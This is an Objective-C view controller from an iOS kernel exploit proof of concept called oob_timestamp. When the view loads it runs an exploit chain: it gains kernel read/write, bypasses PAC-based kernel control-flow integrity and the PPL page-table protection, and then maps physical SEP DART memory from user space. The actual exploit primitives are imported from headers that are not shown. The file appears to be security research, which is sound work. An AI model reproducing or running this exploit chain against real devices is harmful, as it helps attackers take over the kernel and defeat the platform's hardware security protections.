//
//  ViewController.m
//  oob_timestamp
//
//  Created by Brandon Azad on 1/30/20.
//  Copyright © 2020 Brandon Azad. All rights reserved.
//

#import "ViewController.h"

#import "kernel.h"
#import "kernel_call.h"
#import "kernel_memory.h"
#import "oob_timestamp.h"
#import "pac_bypass.h"
#import "ppl_bypass.h"

static void
exploit_main() {
	// Try to initialize basic kernel read/write. If we can, that means that the exploit has
	// been run before.
	bool already_exploited = kernel_init();
	// If we don't have kernel read/write, run the exploit and re-initialize.
	if (!already_exploited) {
		oob_timestamp();
		kernel_init();
	}
	// Bypass PAC-based kernel CFI.
	bool ok = kernel_call_init();
	assert(ok);
	// Bypass PPL to modify page tables.
	ok = kernel_ppl_bypass();
	assert(ok);
	// If we we just ran the exploit, exit to clean up state.
	if (!already_exploited) {
		return;
	}
	// Run experiments here, like accessing MMIO from EL0. :)
	volatile uint32_t *sep_dart = physical_window_map(0x2412c0000, 0x0060000000000e4f);
	for (int i = 0; i < 4; i++) {
		printf("SEP_DART[%2d]  %08x\n", i, sep_dart[i]);
	}
}

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
	[super viewDidLoad];
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
		exploit_main();
		usleep(100 * 1000);
		exit(1);
	});
}


@end
